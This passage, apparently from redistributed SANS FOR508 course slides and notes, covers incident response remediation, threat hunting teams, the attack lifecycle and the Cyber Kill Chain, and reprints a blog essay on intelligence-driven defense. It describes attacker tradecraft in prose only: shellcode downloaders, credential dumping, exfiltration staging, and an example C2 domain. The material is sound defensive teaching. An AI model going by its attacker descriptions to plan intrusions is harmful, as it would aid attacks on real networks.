were monitoring the “uptime” of systems to ensure the power had not been cut to allow for disk imaging, which
was an indicator to the attackers that they had been discovered. Our strategy quickly evolved from pull the plug
and image the system to “image live” and “monitor with a kill switch.” Incident response is a chess match, and
the better you understand your opponent, the more moves you can make on the board.
Active defense and containment capabilities employed by responders include decoy datasets, corrupting data,
preventing data exfiltration or lateral movement, and employing kill switches on the network. Full-packet
capture monitoring of adversary-controlled systems and network segments can be incredibly useful. In some
cases, organizations have deployed their own host-based monitors and key loggers to specifically spy on the
adversary’s every move. Containment is only limited by your intelligence capability, creativity, and resources.

.

[1] Moonlight Maze: https://for508.com/8uh5y

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

25

Incident Response Detection and Intelligence Loop
Preparation

Follow-Up/
Lessons
Learned

Identification
and Scoping

Recovery

Containment/
Intelligence
Development

Eradication/
Remediation

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In practice, the two critical phases of “Identification and scoping” and “Containment / Intelligence
Development” form a mini-cycle unto themselves. Information gleaned during forensic analysis in the
intelligence collection phase is used to further scope the network, identifying previously unknown compromised
systems. Those new systems are analyzed, providing additional information on adversary actions and new
IOCs, which are then used to find even more systems. This synergistic loop continues until the incident response
team believes they have fully scoped the incident and are ready to attempt eradication and remediation of the
environment.

26

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

26

Eradication/

Remediation Is Hard

Remediation

Threats are good at avoiding
detection and ensuring survivability
Threats react to countermeasures
and remediation tactics
Threats will return
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

27

.

Nothing is more important to an organization than finally removing the adversary threat from the network.
Sadly, this is much easier said than done and most organizations move to this step too soon after incident
detection. Without proper scoping and intelligence collection, remediation is simply not possible. Pre-emptive
remediation ends up only annoying the adversary, causing them to change tactics, and ultimately making it
harder for the IR team to track and complete the incident response process. In the end, remediation is a part of
an ongoing incident response cycle. Many organizations fail in their first attempts at remediation. It can be
very difficult to fully scope an intrusion in a large network and ensure that all attacker command and control
infrastructure is accounted for. During these failures, the team will re-trench, go back to the scoping phase and
continue their intelligence collection on the adversary. In this way, remediation is much more like a relay race
than a sprint.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

27

A typical failed remediation might happen like this:
1.
2.
3.
4.
5.
6.
7.

Response team removes/rebuilds all known compromised hosts and blocks IP addresses, domains, resetting
possible compromised accounts.
Response team, not having scoped out the full intrusion before tipping its hand, ends up showing the
adversary how it found them by removing specific systems.
Adversary, not knowing if the response team is any good, deploys new malware to ensure long-term access
to the network.
Response team and management feel a sense of satisfaction, as they “removed the threat” from their
environment.
Attacker maintains access but is using new capabilities not seen before by the response team.
This continues until the attacker makes a mistake or an external organization notifies the organization of
the intrusion, and the cycle generally repeats itself.
Go to step 1; full eradication did not take place. The adversary survived remediation.

Why is successful remediation so difficult to accomplish? Modern adversaries are veterans at the game. They
are extremely good at avoiding detection and ultimately plan on being detected at some point. As a result, they
often go to great lengths to ensure survivability beyond attempts at remediation. Even when an attacker is
successfully remediated, expect a new wave of attacks immediately following. The typical adversary today is a
well-resourced, professional organization with the time and resources available to continually attempt re-entry
into a network.

A remediation event should:
1.
2.
3.
4.

.

Remediation Events
Remediation takes time to plan. Planning should start almost immediately after the start of an incident response.
It almost always involves additional groups outside of the incident response team, with massive coordination
required to enact a burst of network changes over a short period of time. This is commonly called a
“Remediation Event.” Remediation events are often planned over a weekend when an organization can commit
to purging an adversary from its network without greatly impacting business operations.

Deny access to the environment
Eliminate the ability for the adversary to react to the remediation
Remove the presence of the adversary from the environment
Degrade the ability of the adversary to return

Remediation consists of three steps:
1.
2.
3.

Posture for remediation
Execute remediation
Implement and apply additional security controls

Critical Remediation Event Steps
During the remediation, there is no one right solution to apply. This is one of the reasons that remediation
planning takes some time to complete. Understanding and knowing your adversary through intelligence-driven
incident response is key. You need to know every host and system compromised by your attackers. You should
detail security controls that would degrade and deny the ability of the adversary to function properly.
Regardless of the specific tactical options you might consider planning during remediation, here are a few
critical recommendations we recommend you consider.
Critical remediation controls include but are not limited to:
1.
2.
28

Disconnect the environment from the Internet.
Implement strict network segmentation not allowing specific subnets to communicate with each other.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

3.
4.
5.
6.
7.
8.

Block IP addresses and domain names for known C2 channels.
Remove all infected systems that maintained active or previous active malware on the host.
If needed, remove all systems identified as compromised but do not show signs of infection via malware.
Restrict access to known compromised accounts.
Restrict access to domain administrator accounts.
Validate that everything above is done properly.

The last step is incredibly important because people make mistakes and oversights. Leaving one compromised
host online after a remediation event likely means you will need to start over from the beginning. Everyone
wants this to succeed, so it is imperative that there are two sets of eyes to verify that each task is done properly.
A mistake during this phase is costly because it not only allows continued access for the adversary, but it also
tips your hand of what you know about them. The adversary is likely to immediately scramble to deploy new
malware, maintain a presence by infecting additional hosts that might have already been cleaned up, and change
their tactics to become more invisible to the incident response team.
Finally, once the remediation is successful, additional security controls should be deployed within the
environment. You want to implement additional measures to increase the chance of detection of the adversary
while degrading the ease of maneuverability to the threat. There are many new solutions that can be
implemented but following the SANS Critical Controls is a good first step.[1] Most organizations underestimate
how implementing the basics, like the top four critical controls, makes incident response and active defense
much more doable and less costly. Eliminating noise in an environment makes finding future adversaries much
easier.

.

[1] http://for508.com/lqe4r

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

29

Eradication/

Real-Time Remediation

Remediation

Advances in network and endpoint monitoring provide some
organizations with the ability to mitigate attacks in real-time
• Requires complete enterprise visibility and mature processes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

With proper visibility, remediation can (and should) begin on day one of an incident. The new way forward in
incident response is a remediation-focused approach. The primary goal of any incident response is to
successfully remediate the environment by eliminating attacker access and preventing further data loss.
Visibility allows responders to initiate these actions much earlier in the response cycle, actively countering
threats as they are found, instead of waiting until weeks or months after the initial incident to perform a largescale sneak attack with no guarantee of success. Visibility is king, and like any battlefield, incident responders
are in a race to take the high ground from the adversary. Advances in network and endpoint forensics coupled
with lowered costs of storage and computational power can now provide historical visibility unheard of even a
few years ago. Once an indicator of attack is discovered, the ability to go back in time and see where else that
activity was recorded significantly reduces identification and containment times and greatly increases the cost to
the adversary. Endpoint detection and response tools are widely providing this capability.
Of course, everything takes work, and instrumenting your network for visibility requires a proactive approach
best accomplished when not in the heat of an incident. Given the near inevitability of a compromise, the most
successful teams are putting the work in up front to prepare the battleground. Erecting watchtowers, testing
defenses and detection capabilities, and re-architecting networks to reduce the attack surface of oft-abused
credentials and egress points all pay dividends far out of proportion with the upfront effort. Investing in threat
intelligence and better instrumented networks also facilitates active hunting on the network. In short, most
organizations have a lot of work on the basics to accomplish before challenging adversaries in real-time. But
the goal is achievable—there are organizations, at this moment, operating at the top of the pyramid at the same
tempo as their adversaries.
Incident Response Hierarchy of Needs provided under Creative Commons by Matt Swann
https://github.com/swannman/ircapabilities

30

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

30

Reactive Response vs. Threat Hunting

Hunting Organization

Reactive Organization
• Incident starts when notification
comes in
• Call from government agency
• Vendor/threat information
• Security appliance alert
• “Five-alarm fire” response

• Actively looking for incidents
• Known malware and variants
• Patterns of activity: evil versus
normal
• Threat intelligence
• Security patrols
• Reduce adversary dwell time

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

31

.

A reactive organization begins incident response when an alert or notification comes in. The alert could come
from a third party such as the FBI, or it could come from the organization’s own security sensors. The best
analogy to a reactive approach is the IR team is largely waiting to be called into action and relying on the
accuracy of the notifications it is receiving. Most organizations start building their incident response teams as a
reactive organization. In many cases, the IR team is comprised of augmentation staff that normally fulfill other
duties during their regular jobs. As the organization grows larger or as it has an increasing number of incidents,
the team might become permanent. The best analogy here is small towns with volunteer fire departments versus
full-time fire fighters. Even larger organizations augment their IR teams with additional personnel internally or
contract with consultants who provide surge-based incident response services.
Organizations should move to a hunting posture when they have optimized their IR process and are still not
detecting incidents early enough. A primary goal of hunting is to reduce the dwell time of attackers. In this
model, instead of waiting for alerts to appear, hunt team members actively scour the enterprise to identify
attacks in progress. This is very similar to internal security patrols used by the military to protect bases and
territory. Moving to hunting-based response is not an “either or” approach. Most hunting organizations are also
reactive organizations, but they begin to task their incident response team to also actively engage and hunt for
adversaries. To accomplish this task, the hunting team typically will start with known malware of interest,
patterns of activity, or accurate threat intelligence aiding them in their search.
Organizations who decide to create a hunting organization sometimes fail to see the importance of proper
preparation and threat intelligence for driving the search in the right areas. Simply tasking a team to “find evil”
is not enough. The team needs to know the difference between normal and abnormal in the environment. It
needs to know typical hacker tools and techniques. It needs to be skilled in both network and host-based
forensics to look for attack residue. Finally, it helps if the organization has invested in a cyber threat intelligence
capability that will accurately guide and help the team prioritize the right indicators and right locations on the
network to search for the latest attacks occurring in the wild.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

31

Identification/Scoping: Hunting vs. Reactive Response

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Threat hunting has become popular across the industry simply because it works. As a good pen test will
demonstrate, attackers can be infinitely creative with finding new and undocumented ways to breach a network.
The only current way to counter those types of attacks is with other humans inventing equally clever ways to
detect attacker activity. Hunting, in its current state, is human vs. human with technology used as a force
multiplier. Hunt teams can be a critical part of your security eco-system, discovering novel ways to detect the
latest threat activity that is not already being detected with automated tools. As the graphic on this slide shows,
that information should flow back to your security operations center (SOC) to be automated and folded into your
continuous monitoring process. Said another way, hunt teams should be looking for new detection methods that
can then be automated for enterprise-wide detection. They can also uncover data and reporting deficiencies that
can pay dividends when incidents occur.
IR and Hunt Team Roles
Digital forensics is the process used to analyze systems (host and network data) in order to identify
compromised systems and provide guidance on necessary remediation steps. Being able to properly collect
intelligence depends greatly on the team’s ability to analyze the remnants of intruder activity and use that
information to identify other compromised infrastructure. As a result, your team should be made up of host,
network, and reverse engineers working side by side to identify newly compromised systems, create new threat
intelligence data, and use that data to identify new systems or to engineer additional defenses to help contain the
current incident. A suggested team composition follows:
1 Team lead
1–2 Endpoint / host / cloud analysts
1–2 Network analysts
1 Reverse engineering malware specialist
1 DevOps / tool development resource
Humans are the most important components of a hunt team (and a security team in general), but technology is
also important. The team should have an enterprise scanning capability for both host and network-based
signatures. Do not fall into the trap of believing hunting requires sophisticated commercial tools. A team could
easily use built-in PowerShell remoting to accomplish amazing things. In a nutshell, outfitting a hunt team
requires the ability to access a wide variety of data sources and capabilities in the enterprise. The more options a
32

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

32

team has for gathering and examining data, the higher the success rate.
Cyber Threat Intelligence Role in Hunt Teaming
A key component to building a hunt team is a cyber threat intelligence capability residing inside your security
team and feeding directly to the hunt team. It is always surprising to hear organizations that have committed to
staffing a hunting team and when asked what the team is looking for on the network, the response is “we don’t
know.” A proper cyber threat intelligence capability will arm the hunting team with:
Where to look: In what data might sophisticated threat actors be particularly interested?
What to look for: Host, network, and malware artifacts, registry keys, tools such as PSEXEC, living off the
land binaries, WMI, PowerShell, etc.
Likelihood of attack: Which threat groups are most likely to target our network?
Right Mindset
Hunt teams require both manual and automated methods of collecting and searching data across an enterprise
network. A single hunt team member should be able to scale up to searching thousands of hosts for a single
forensic artifact. Alternatively, they might need to dive deeply into a single system trying to uncover unknown
malware. The challenge is always to know when analysis is complete, and the hunter should move on. The
analyst will always feel like they missed something, did not have the right skills to find it, or the adversary is
simply better than them. No amount of searching will help remove the doubt that comes with hunting and not
finding anything of substance. A good hunt team manager will constantly need to nudge analysts on to the next
artifact to look for.
Without any type of threat intelligence, most hunting groups are simply tasked with looking for “things that look
weird” perhaps without even knowing what weird versus normal looks like. A trained hunter must know the
difference between normal and abnormal as a prerequisite. Even better, if a threat intelligence capability is
informing the team, they will organize hunts to look for specific threat groups targeting specific programs using
specific techniques. This is an achievable goal.

.

Hunt Team Operational Tempo
A common challenge of hunt teams is operational tempo. Incident response initiated by reactive response teams
is usually a sprint with long days, seven days a week, until the incident is remediated. While this scenario is
typical for reactive response teams it could be the death of your hunt team.
Hunt teams will consistently find new breaches if they are good. If every breach detected is treated like a 24/7
fire drill, the team will soon be exhausted. Fire fighters fighting forest blazes for week take days off to
recuperate. In fact, the operational tempo is purposely slower to ensure no one is working a fire line who is
exhausted. Forcing your incident response hunt teams to take days off, weekends off, vacations, and spending
time with family is a must. They should come in at 8 AM and work till 5 PM like everyone else. The only
difference is that a hunt team works its nine hours a day finding evil and responding to it consistently. Good
hunt teams will always be in the middle of an engagement fighting an adversary—fighting the adversary is
simply what their job is. It is not a fire drill.
Management Support of the Hunt Team
Management buy-in is also a must. In many cases, management thinks it wants to know about breaches, but we
have found over the years many organizations are far more concerned about what happens when breaches are
found rather than whether they exist in the first place. This could be due to breach reporting requirements or
regulatory fines levied if a breach is discovered. You might get management buy-in on paper, but management
may see hunt teaming like going to the doctor to see whether they have contracted a superbug disease or cancer.
Few people really want the truth even when it is good for them in the long run. Once management knows about
an intrusion, they must do something about it.
Now, not all management ignores the usefulness of a hunt team. Generally, organizations that are hit by enough
adversaries begin to form a thickness of skin and desensitization to the news of a breach. Strong management
will simply want to know how effective the team is and how many adversaries it is currently tracking. In our
experience, management warms up to the idea of hunt teams eventually, but do not be surprised if they are not
excited initially when the hunt team ends up being a little too successful.
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

33

Advanced Incident Response and Threat Hunting Agenda

Incident Response & Threat Hunting
Threat Intelligence
Malware-ology
Malware Persistence
Incident Response: Hunting Across the Enterprise
Credential Theft
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

34

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

34

Threat Intelligence
Tracking Attacker Behavior

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

35

.

This page intentionally left blank.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

35

The Attack Lifecycle

Threat intelligence maps attacker techniques, tactics,
and procedures (TTPs) to the attack lifecycle

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Threat intelligence attempts to map attacker techniques, tactics, and procedures to the attack lifecycle. Nearly
all attacks progress through a series of common steps to accomplish adversary objectives. Understanding these
steps allows defenders to craft opportunities to discover attacks while in progress. The model on this slide is
sourced from documentation on Microsoft Advanced Threat Analytics, and it does a commendable job of
demonstrating the cyclical nature of attacks as attackers perform network discovery and elevate privileges to
achieve greater access.
• Initial compromise: Most initial compromises are not persistent, and the level of access achieved by an
adversary at this stage is generally very fragile. If a response team can eliminate an adversary before they
establish a foothold on the network, then survivability of the adversary drops to nearly zero. Unfortunately,
this can be extremely hard to accomplish because initial reconnaissance and exploit delivery leave few
discernable artifacts that rise above the noise of constant attacks against the network.
• Low privileges lateral movement cycle: During this phase an attacker must maintain persistence within the
environment and expand their foothold, gaining access to additional systems. The placement of persistent
backdoors is common. Large amounts of lateral movement paired with credential dumping is seen during
this phase as high-level credentials are required to achieve most attacker goals.
• High privileges lateral movement cycle: Once high-level credentials are achieved, the attack shifts from
mass credential collection to asset collection as the adversary extends their influence within the environment
and prepares to accomplish their ultimate objectives. Since high-level credentials are (sadly) often
discovered early in the attack, the phase can comprise the longest length of time of the intrusion. Tracking
unusual credential usage, lateral movement, and abnormal system access are important capabilities in finding
attacker activity in this phase.
• Asset access and data exfiltration: Adversaries leave many footprints as they search for and collect data of
interest. The process of finding specific data on a remote network is challenging. You might have a hard
time doing it on your own systems; imagine what it would be like to try and find an important file out of
millions of files across thousands of hosts! Once assets and data are identified, an attacker must find a way
to exfiltrate it. This is often easier said than done because moving a large quantity of data outside the
network is likely to be caught by network monitoring. It is common for attackers to find and utilize a
“staging system” in order to accomplish this goal. An alternative to data exfiltration is the setup of
36

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

36

destructive attacks like ransomware. Similar to data exfiltration, the most sophisticated attackers can spend
weeks or even months learning about a network before deploying their final payloads.

.

The flip side of this lifecycle is the incident response team charged with identifying intrusion activity. The best
teams employ intelligence-driven incident response, using the identification/scoping and
containment/intelligence stages of the incident response cycle to understand an adversary both during and after
an incident. By collecting intelligence at each phase of the attack lifecycle, defenders can more easily counter
adversary activity and employ mechanisms, both automated and manual, to find them in the future. The latter
point is important as it implies the same adversary will likely be seen again, and the knowledge gained during
this intrusion can allow faster mitigation of future attacks.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

37

Lockheed Martin’s Cyber Kill Chain®
Reconnaissance

• Research, identification, and selection of targets

Weaponization

• Determining best method of exploitation

Delivery

• Send exploit or capability to remote system

Exploitation

• Initial access achieved to target provided by
exploit or other means

Installation

• Achieve repeatable access via persistent
techniques or tools

Command and
Control
Actions on Objective

• Remotely direct/exploit target via C2 capability –
attacker shell, command prompt, or PowerShell
• Achieve intrusion objectives: laterally move,
find/exfiltrate data, disruption, or denial of
service

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

The “Kill Chain” is an important model used in threat intelligence. It helps categorize the sequence of actions
occurring in most attacks and provides a framework for organizing detection indicators. It is best described by
one of its authors, Mike Cloppert:

.

Security Intelligence: Attacking the Cyber Kill Chain
Now we will introduce the attack progression (known as "kill chain") and briefly describe its intersection with
indicators. The next segment will go into more detail about how to use the attack progression model for more
effective analysis and defense, including a few contrived examples based on real attacks.
On Indicators
Just like everyone, adversaries have various computer resources at their disposal. They have favorite computers,
applications, techniques, websites, etc. It is these fundamental human tendencies and technical limitations that
we exploit by collecting information on our adversaries. No person acts truly random, and no person has truly
infinite resources at their disposal. Thus, it behooves us in CND to record, track, and group information on our
sophisticated adversaries to develop profiles. With these profiles, we can draw inferences, and with those
inferences, we can be more adaptive and effectively defend our data. After all, that's what intelligence-driven
response is all about: defending data that sophisticated adversaries want. It's not about the computers. It's not
about the networks. It's about the data. We have it, and they want it.
Indicators can be classified a number of ways. Over the years, my colleagues and I have wrestled with the most
effective way to break them down. Currently, I am of the mind that indicators fall into one of three types:
atomic, computed, and behavioral (or TTPs).
Atomic indicators are pieces of data that are indicators of adversary activity on their own. Examples include IP
addresses, email addresses, a static string in a Covert Command and control (C2) channel, or fully qualified
domain names (FQDNs). Atomic indicators can be problematic because they might or might not exclusively
represent activity by an adversary. For instance, an IP address from where an attack is launched could very
likely be an otherwise legitimate site. Atomic indicators often need vetting through analysis of available
historical data to determine whether they exclusively represent hostile intent.

38

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

38

Computed indicators are those that are, well, computed. The most common among these indicators are hashes
of malicious files, but they can also include specific data in decoded custom C2 protocols, etc. Your more
complicated IDS signatures might fall into this category.
Behavioral indicators are those that combine other indicators (including other behaviors) to form a profile.
Here is an example: Bad guy 1 likes to use IP addresses in West Hackistan to relay email through East
Hackistan and target our sales folks with trojaned MS Word documents that discuss our upcoming benefits
enrollment, which drops backdoors that communicate to A.B.C.D. Here, we see a combination of computed
indicators (geolocation of IP addresses, MS Word attachments determined by a magic number, and base64
encoded in email attachments), behaviors (targets sales force), and atomic indicators (A.B.C.D C2). Already,
you can probably see where we're going with intelligence-driven response. What if we can detect, or at least
investigate, behavior that matches that which I described previously?
One likes to think of indicators as conceptually straightforward, but the truth is that proper classification and
storage has been elusive. I'll save the intricacies of indicator difficulties for a later discussion.
Adversary Behavior
The behavioral aspect of indicators deserves its own section. Indeed, most of what we discuss in this
installment centers on understanding behavior. The best way to behaviorally describe an adversary is by how
they do their job. After all, this is the only discoverable part for an organization that is strictly CND (some of
our friends in the USG likely have better ways of understanding adversaries). That "job" is compromising
data, and therefore we describe our attacker in terms of the anatomy of her attacks.

.

Ideally, if we could attach a human being to each and every observed activity on our network and hosts, we
could easily identify our attackers and respond appropriately every time. At this point in history, that sort of
capability passes beyond pipe dream into ludicrous. However mad this goal is, it provides a target for our
analysis: We need to push our detection "closer" to the adversary. If all we know is the forged email address
an adversary tends to use in delivering hostile email, assuming this is uniquely linked to malicious behavior,
we have a mutable and temporal indicator upon which to detect. Sure, we can easily discover when it's used in
the future, and we are obliged to do so as part of our due diligence. The problem is this can be changed at any
time on a whim. If, however, the adversary has found an open mail relay that no one else uses, then we have
found an indicator "closer" to the adversary. It's much more difficult (though, in the scheme of things, still
somewhat easy) to find a new open mail relay to use than it is to change the forged sending address. Thus, we
have pushed our detection "closer" to the adversary. Atomic, computed, and behavioral indicators can describe
more or less mutable/temporal indicators in a hierarchy. We as analysts seek the most static of all indicators, at
the top of this list, but often must settle for indicators further from the adversary until those key elements
reveal themselves.
That this analysis begins with the adversary and then dovetails into defense makes it very much a security
intelligence technique, as we've defined the term. Following a sophisticated actor over time is analogous to
watching someone's shadow. Many factors influence what you see, such as the time of day, angle of the sun,
etc. After you account for these variables, you begin to notice nuances in how the person moves, observations
that make the shadow distinct from others. Eventually, you know so much about how the person moves that
you can pick him out of a crowd of shadows. However, you never know for sure if you're looking at the same
person. At that point, for our purposes, it doesn't matter. If it looks like a duck and sounds like a duck... it
hacks like a duck. Whether the same person (or even group) is truly at the other end of behavior every time is
immaterial if the profile you build facilitates predicting future activity and detecting it.
Attack Progression, or the Kill Chain
We have found that the phases of an attack can be described by six sequential stages. Once again, loosely
borrowing vernacular, the phases of an operation can be described as a “kill chain.” This is a linear flow—
some phases might occur in parallel, and the order of earlier phases can be interchanged—but rather how far
along an adversary has progressed in his or her attack, the corresponding damage, and investigation that must
be performed.

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

39

Recon
The reconnaissance phase is straightforward. However, in security intelligence, oftentimes this is manifested
not in portscans, system enumeration, or the like. It is the data equivalent: browsing websites, pulling down
PDFs, learning the internal structure of the target organization. A few years ago, I never would've believed
that people went to this level of effort to target an organization, but after witnessing it happen, I can say with
confidence that it does. The problem with activity in this phase is that it is often indistinguishable from normal
activity. There are precious few cases where one can collect information here and find associated behavior in
the delivery phase matching an adversary's behavioral profile with high confidence and a low false positive
rate. These cases are truly gems; when they can be identified, they link what are often two normal-looking
events in a way that greatly enhances detection. The weaponization phase might or might not happen after
reconnaissance; it is placed here merely for convenience. This is the one phase that the victim doesn't see
happen but can very much detect. Weaponization is the act of placing malicious payload into a delivery
vehicle. It's the difference in how a Russian warhead is wired to the detonator versus how a U.S. warhead is
wired in. For us, it is the technique used to obfuscate shellcode, the way an executable is packed into a
trojaned document, etc. Detection of this is not always possible, nor is it always predictable, but when it can be
done, it is a highly effective technique. Only by reverse engineering of delivered payloads is an understanding
of an adversary's weaponization achieved. This is distinctly separate and often persistent across the subsequent
stages.
Delivery
Delivery is rather straightforward. Whether it is an HTTP request containing SQL injection code or an email
with a hyperlink to a compromised website, this is the critical phase where the payload is delivered to its
target. I heard a term just the other day that I really like: "warheads on foreheads" (courtesy of the U.S. Army).

.

Exploitation
The compromise phase will possibly have elements of a software vulnerability, a human vulnerability known
as "social engineering," or a hardware vulnerability. Although the latter are quite rare by comparison, I include
hardware vulnerabilities for the sake of completeness. The compromise of the target might itself be
multiphase or more straightforward. As a result, we sometimes have the tendency to pull apart this phase into
separate sub-phases or peel out "Compromise" and "Exploit" as wholly separate. For simplicity's sake, we'll
keep this as a single phase. A single-phase exploit results in the compromised host behaving according to the
attacker's wishes directly as a result of the successful execution of the delivered payload, for example, if an
attacker coaxes a user into running an EXE attachment to an email, which contained the desired backdoor
code. A multiphase exploit typically will involve delivery of shellcode whose sole function is to pull down and
execute more capable code upon execution. Shellcode often needs to be portable for a variety of reasons,
necessitating such an approach. We have seen other cases where, possibly through sheer laziness, adversaries
end up delivering exploits whose downloaders download other downloaders before finally installing the
desired code. As you can imagine, the more phases involved, the lower an adversary's probability of success.
This is the pivotal phase of the attack. If this phase completes successfully, what we as security analysts have
classically called "incident response" is initiated: Code is present on a machine that should not be there.
However, as will be discussed later, the notion of "incident response" is so different in intelligence-driven
response (and the classic model so inapplicable) that we have started to move away from using the term
altogether. The better term for security intelligence is "compromise response" because it removes ambiguity
from the term "incident.”
C2: Maintain Presence
The command and control phase of the attack represents the period after which adversaries leverage the
exploit of a system. A compromise does not necessarily mean C2, just as C2 doesn't necessarily mean
exfiltration. In fact, we will discuss how this can be exploited in CND but recognize that successful
communications back to the adversary often must be made before any potential for impact to data can be
realized. This can be prevented intentionally by identifying C2 in unsuccessful past attacks by the same
adversary, resulting in network mitigations, or fortuitously when adversaries drop malware that is somehow
incompatible with your network infrastructure, to give but two examples.

40

© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

In addition to the phone call going through, someone has to be present at the other end to receive it. Your
adversaries take time off too... but not all of them. In fact, a few groups have been observed to be so responsive
that it suggests a mature organization with shifts and procedures behind the attack more refined than that of
many incident response organizations.
Actions on Objectives
The Actions on Objectives phase is conceptually very simple: For most APTs, this is when the data, which has
been the ultimate target all along, is taken. Previously, I mentioned that gathering information about the
environment of the compromised machine doesn't fall into the exfiltration phase. The reason for this is that such
data is being gathered to serve but one purpose, either immediately or longer term to facilitate collection and
theft of the target information: the source code for the new O/S, the new widget that cost billions to develop, and
access to the credit cards or PII. Adversary objectives could also fall into the category of denial of service, data
destruction, or more.
We will also lump lateral movement with compromised credentials, file system enumeration, and additional tool
dropping by adversaries broadly into this phase of the attack. Although an argument can be made that situational
awareness of the compromised environment is, technically, "exfiltration.”
Security Intelligence Using the Kill Chain Successfully
(Included with permission from Mike Cloppert as originally published on the SANS Computer Forensics Blog.)
The "persistence" in APT intrusions is manifested in two ways: maintaining a presence on your network, as well
as repeatedly attempting to gain entry to areas where presence is not established. The repeatability of these
activities inevitably involves attributes that are consistent because resource constraints typically prevent
adversaries from acting differently every time, they set foot in your environment. With a way to model
intrusions and align these common attributes, network defenders can take advantage of persistence to profile
their adversaries, informing strategic response, analysis efforts, and resource investment.

.

A single intrusion, as we have already discussed, can be modeled as seven phases. Within each of these phases
of an intrusion is a highly dimensional set of indicators—computer scientists would call them "attributes"—that
together uniquely define that intrusion. For example, a C2 callback domain is an indicator attribute;
talktome.bad.com is the corresponding value of the indicator. The targeting used (reconnaissance), the way in
which the malicious payload is obscured (weaponization), the path the payload takes (delivery), the way the
payload is invoked (exploit), where the backdoor is hidden on the system (installation), the protocol used to call
back to the adversary (C2), and habits of the adversary once control is established (actions on intent) are all
categorical examples of these indicators. It is up to the analyst to discover the significant or uniquely identifying
indicators in an intrusion. In some cases, there are common indicators—for example, the last-hop email relay
used to deliver a message will be significant in most like intrusions, excluding webmail. In others, the attributes
can be unique and surprising—a piece of metadata, a string in the binary of a backdoor, and a predictably
malformed HTTP request to check for connectivity.
Be aware that adversaries shift tactics over time. A campaign is not static, nor are the key indicators or their
corresponding values. We've seen adversaries use the same delivery and C2 infrastructure for years, whereas
others will shift from consistent infrastructure in the Delivery and C2 phases to highly variable infrastructure in
the delivery phase but consistent targeting and weaponization techniques. Some adversaries will have consistent
key indicators, such as tool artifacts in the Delivery and Weaponization phases, but the specific indicator values
might change over time. Without constant and complete analysis of sophisticated intrusions, knowledge of
campaigns becomes stale and ineffective at predicting future intrusions.
Gathering Intel through Kill Chain Completion
To have the dataset necessary to link intrusions and identify key indicators, analysts must understand all phases
of every sophisticated intrusion. Initial detection of an intrusion might occur at any point across the kill chain.
Even if the attack is unsuccessful, detection is just the first step.
Classic incident response methodology assumes a system compromise. In this situation, where a detection
happens after the installation and/or execution of malicious code, adversaries have successfully executed many
© 2023 SANS Institute

Join us now -> . | donate.. | t.me/Hide01 | t.me/RedBlueHit

41

steps in their intrusion. As the intrusion progresses forward in the kill chain, so the corresponding analysis
progresses backward. Analysts must reconstruct every prior stage, necessitating not only the proper tools and
infrastructure to do so but also deep network and host forensic skills. Less mature response teams will often get
stuck in the delivery to installation phases. Without knowledge of what happened earlier in an intrusion, network
defenders will be unable to define campaigns at these earlier phases, and response to intrusions will continue to
happen post-compromise because this is where the detections and mitigations are. When walls are hit in analysis
that prevents reconstruction of the entire chain, these barriers represent areas for improvement in
instrumentation or analytical techniques. Where tools do not already exist for accurate and timely
reconstruction, development opportunities exist. Here is but one area where having developers on staff to
support incident responders is critical to the success of the organization.
As response organizations mature and are able to more fully build profiles of intrusion campaigns against them,
they become more successful at detection prior to compromise. However, just as a post-compromise response
involves a significant amount of analysis, the unsuccessful intrusion attempts matching APT campaign
characteristics also require investigation. The phases executed successfully by the adversary must still be
reconstructed, and the phases that were not must be synthesized to the best ability of the responders. This aspect
is critical to identifying any TTP change that may have resulted from a successful compromise. Perhaps the
most attention-grabbing example is the identification of zero-day exploits used by an APT actor at the Delivery
phase before the exploit is invoked.

.

Synthesis clearly demonstrates the criticality of malware reverse engineering skills. It is likely that the backdoor
that would have been dropped, even if it is of a known family, using a known C2 protocol, also contains new
indicators further defining the infrastructure at the disposal of adversaries. Examples include indicators such as
C2 callback IP addresses and fully qualified domain names. Perhaps minor changes in the malicious code would
produce new unique hashes, or a minor version difference results in a slightly different installation filename that
could be unique. Although antivirus is typically a bad example of detection in the context of APT intrusions,
there are times when it can be of value for older variants of code. For instance, how many reading this analyze
emails that are detected by their perimeter antivirus system? If the detection is for a particular backdoor
uniquely linked to an APT campaign, the email could contain valuable indicators about the adversary's delivery
or C2 infrastructure that might be reused later in an intrusion that your antivirus system does not detect.
Detecting campaigns enables resilient detection and prevention mechanisms across an intrusion and engages
CND responders earlier in the kill chain, reducing the number of successful intrusions. It should be obvious but
bears repeating that a lack of specific indicators from a single intrusion prevents identification of key indicators
